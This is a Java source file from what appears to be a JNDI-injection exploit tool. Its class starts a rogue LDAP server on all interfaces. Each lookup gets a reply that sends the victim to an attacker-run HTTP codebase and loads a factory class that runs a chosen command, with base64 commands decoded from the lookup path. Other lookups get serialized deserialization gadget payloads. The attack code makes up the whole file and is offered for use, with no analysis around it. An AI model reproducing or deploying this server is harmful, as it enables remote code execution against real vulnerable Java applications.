package com.bloom.server;


import com.bloom.Template.CommandTemplate;
import com.bloom.exploit.payload;
import com.bloom.util.config;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

import static com.bloom.exploit.payload.choiceMethod;
import static com.bloom.util.Functions.getRandomString;
import static com.bloom.util.Functions.ipCheck;

public class LdapServer extends InMemoryOperationInterceptor {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void lanuchLDAPServer() throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    com.bloom.util.config.ldapPort,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new LdapServer.OperationInterceptor(new URL("http://"+com.bloom.util.config.ip+":"+com.bloom.util.config.httpPort+"/#"+getRandomString())));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + com.bloom.util.config.ldapPort);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }


    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
//            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            System.out.println("Send LDAP reference result for " + base);
            e.addAttribute("javaClassName", "foo");
            String className = "";
            if (base.toLowerCase().startsWith("basic")){
//                String className=this.codebase.getRef().replace('.', '/');
                //basic/base64/b3BlbiAtYSBjYWxjdWxhdG9y
                String method =base.split("/")[1].toLowerCase();
                String command="";

                command=choiceMethod(method,base.substring(base.indexOf("/")+1));//base.substring(base.indexOf("/")+1)=base64/b3BlbiAtYSBjYWxjdWxhdG9y
                CommandTemplate commandTemplate = new CommandTemplate(command);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                e.addAttribute("javaCodeBase", String.valueOf(this.codebase).split("#")[0]);
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                e.addAttribute("javaFactory", className);
            }else {
                String s = payload.choiceTypeByswitch(base);
                try {
                    e.addAttribute("javaSerializedData", Base64.decode(s));
                } catch (Exception e1) {
                    System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
//                    e1.printStackTrace();
                }
            }
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }

    public static void main(String[] args) throws Exception {

//        System.out.println("HttpServerAddress: "+args[0]);
//        System.out.println("HttpServerPort: "+args[1]);
//        System.out.println("LDAPServerPort: "+args[2]);
        String http_server_ip = "127.0.0.1";
        int ldap_port = Integer.valueOf("1389");
        int http_server_port = Integer.valueOf("8080");
        HttpServerStart httpServerStart=new HttpServerStart();
        httpServerStart.start1();
//        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);
//        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);
    }
}